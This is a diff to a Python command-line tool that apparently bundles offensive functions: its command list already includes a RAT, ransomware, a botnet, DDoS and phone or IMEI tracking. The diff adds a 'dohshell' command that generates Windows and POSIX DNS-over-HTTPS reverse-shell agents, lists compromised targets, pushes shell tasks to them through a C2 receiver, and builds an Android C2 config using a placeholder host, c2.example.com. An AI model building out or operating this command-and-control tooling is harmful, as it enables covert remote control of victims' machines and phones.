@@ -238,7 +238,8 @@ def main(argv=None):
                             "trackip", "trackimei", "trackphone",
                             "rat", "ransomware", "botnet", "ddos",
                             "messaging", "stego", "apn", "exif",
-                            "darkweb", "dorks", "shodan", "map2d", "phantomdroid"],
+                            "darkweb", "dorks", "shodan", "map2d", "phantomdroid",
+                            "dohshell"],
                    help="direct command (optional)")
     p.add_argument("--menu", action="store_true", help="manual console")
     p.add_argument("--scope", "-c", dest="cidr", help="autonomous/scan scope CIDR")
@@ -587,6 +588,27 @@ def main(argv=None):
         if a.query == "features":
             print(json.dumps(list_phantomdroid_features(), indent=2, default=str)); return
         print(json.dumps(phantomdroid_dashboard_state(), indent=2, default=str)); return
+    elif a.cmd == "dohshell":
+        from quantum.c2.reverseshell import (
+            generate_doh_reverse_shell_agent,
+            generate_windows_doh_reverse_shell,
+            DoHBeaconReceiver,
+            generate_android_c2_config,
+        )
+        if a.query == "windows":
+            fn = generate_windows_doh_reverse_shell(a.domain or "c2.example.com", a.target or "192.168.1.1:8443")
+            print(json.dumps({"agent": fn, "platform": "windows"}, indent=2)); return
+        if a.query == "targets":
+            receiver = DoHBeaconReceiver(a.domain or "c2.example.com")
+            print(json.dumps(receiver.get_active_targets(), indent=2, default=str)); return
+        if a.query == "task":
+            receiver = DoHBeaconReceiver(a.domain or "c2.example.com")
+            task = receiver.push_task(a.target or "hq", "shell", {"c2_host": a.domain or "c2.example.com", "c2_port": 8443})
+            print(json.dumps(task, indent=2, default=str)); return
+        if a.query == "config":
+            print(json.dumps(generate_android_c2_config(a.domain or "c2.example.com"), indent=2)); return
+        fn = generate_doh_reverse_shell_agent(a.domain or "c2.example.com", a.target or "192.168.1.1:8443")
+        print(json.dumps({"agent": fn, "platform": "posix"}, indent=2)); return
 
 
 if __name__ == "__main__":
